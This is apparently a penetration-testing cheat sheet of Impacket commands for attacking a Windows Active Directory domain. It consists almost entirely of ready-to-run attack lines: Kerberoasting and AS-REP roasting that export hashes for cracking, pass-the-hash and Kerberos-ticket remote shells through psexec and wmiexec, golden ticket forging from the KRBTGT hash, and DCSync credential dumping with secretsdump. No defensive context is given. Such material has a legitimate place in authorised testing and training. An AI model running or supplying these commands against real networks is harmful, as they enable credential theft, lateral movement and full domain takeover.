# Impacket

## Enumeration

{% hint style="info" %}
**-format hashcat to export a formated hash**
{% endhint %}

### **Get AD users**

```csharp
python3 GetADUsers.py -all -k -no-pass -dc-ip <DC_IP> Domain.local/Administrator
```

### Get SPN users

#### with a ticket

```csharp
./GetUserSPNs.py -k -no-pass -dc-ip <DC_IP> Domain.local/Administrator
```

#### with a password

```csharp
./GetUserSPNs.py -request -dc-ip <DC_IP> Domain.local/Administrator
```

#### Account witch doesn't require Kerberos Authentication

```csharp
./GetNPUsers.py -dc-ip 10.110.0.222 -request 'crook.badcorp.local/' -format hashcat
```

## File server

```csharp
sudo ./smbserver.py Test /tmp -smb2support -user polo -password test123 
```

## Psexec

{% hint style="warning" %}
Ensure that you added the DC ip into /etc/hosts and set up the DNS into /etc/resolv.conf
{% endhint %}

### Pass the hash

```csharp
./psexec.py -hashes <ntlm hash:ntlm hash> Administrator@<HOSTNAME>
```

### Kerberos ticket

```csharp
./psexec.py CROOK.BADCORP.LOCAL/Administrator@DC103 -k -no-pass
```

## Wmiexec

{% hint style="warning" %}
As opposite to psexec which provides NT LOCAL/System shell, wmiexec allows to keep the requested user context, i.e. Domain\Administrator will get an Domain\Administrator shell.
{% endhint %}

### login / password

```csharp
proxychains ./wmiexec.py  Domain/user:Password@1.2.3.4
```

### kerberos ticket

{% hint style="info" %}
Kerberos ticket must be injected first.
{% endhint %}

```csharp
./wmiexec.py CROOK.BADCORP.LOCAL/Administrator@DC103 -k -no-pass
```

## Kerberos Golden Ticket

### Request a TGT

```csharp
./ticketer.py -nthash <KRBTGT NTLM HASH> -domain-sid <DOMAIN SID> -domain <MYDOMAIN.LOCAL> Administrator
```

### Import the TGT

```csharp
export KRB5CCNAME=krb5cc_91801115_mine
```

### Connect using the ticket

```csharp
./psexec.py CROOK.BADCORP.LOCAL/Administrator@10.110.0.222 -k -no-pass
```

### DSYNC

```csharp
./secretsdump.py crook.badcorp.local/User:Password@10.110.0.222
```

## MSSQLclient.py

```csharp
./mssqlclient.py user@server -windows-auth
```

